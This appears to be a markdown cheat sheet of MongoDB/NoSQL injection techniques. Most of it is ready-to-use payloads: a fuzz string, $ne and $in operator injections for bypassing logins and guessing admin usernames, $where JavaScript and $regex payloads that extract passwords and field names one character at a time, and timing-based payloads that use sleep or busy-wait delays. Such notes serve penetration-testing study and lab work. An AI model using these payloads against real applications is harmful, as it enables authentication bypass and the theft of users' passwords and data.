# NoSQL

## Fuzzing in MongoDB
- MongoDB fuzz string: `%27%22%60%7B%0A%3B%24Foo%7D%0A%24Foo+%5CxYZ`
  - In plaintext:
    ```
    '"`{
    ;$Foo}
    $Foo \xYZ
    ```
  - In JS: ```'\"`{\r;$Foo}\n$Foo \\xYZ\u0000```
  - If this causes an error you can use backslash to remove a character at a time to see which are processed.
  - The null character `%00` or `\u0000` may cause everything following to be ignored

## Operators in MongoDB
- $where --> where this is true
- $ne --> not equal to
- $in --> in an array
- $regex --> matches this regex
- Submitting:
  - Need to be nested objects: `{"username": {"$ne","invalid"}}` or as a query `username[$ne]=invalid`
  - Query to test for various admin users: `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`

## Extracting data
### Finding a users password in MongoDB
- If the $where operator is used, you can may be able to send javascript to get the password: `{"$where":"this.username == 'admin' && this.password[0] == 'a' || 'a'=='b"}`
- You can use the match function to also get information like if there is digits: `{"$where":"this.username == 'admin' && this.password.match(/\d/) || 'a'=='b"}`
- If you have a vaild field this match statement can get a field value: `"$where":"this.<field-name>.match('^.{0}a.*')"`
    - The 0 is the character location and a is the character you are comparing it to
- Regex can also be used: `{"username":"admin","password":{"$regex":"^a*"}}`
  - This sees if the password starts with a
### Identifing field names
- To identify field names use three requests:
  - The first uses the field you want to know if it exists
  - The second to a field you know exists
  - The third to a random field that most likely does not exist
  - Compare the responses
- Another way is to use the match operator in $where: `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
  - This returns the first character
  - The 0 is the character location and a is the character you are comparing it to
### Injecting operators
- You can add operators to the json or query to see if they are evaluated, for example `"$where": "0"` and `"$where": "1"` could be used because if it is evaluated then one would be true and the other false
### Timing based injection
- Both of this trigger a time delay for 5000 ms if a is the first character:
  ```
  {"$where":"this.username == 'admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'}
  {"$where":"this.username == 'admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'}
  ```
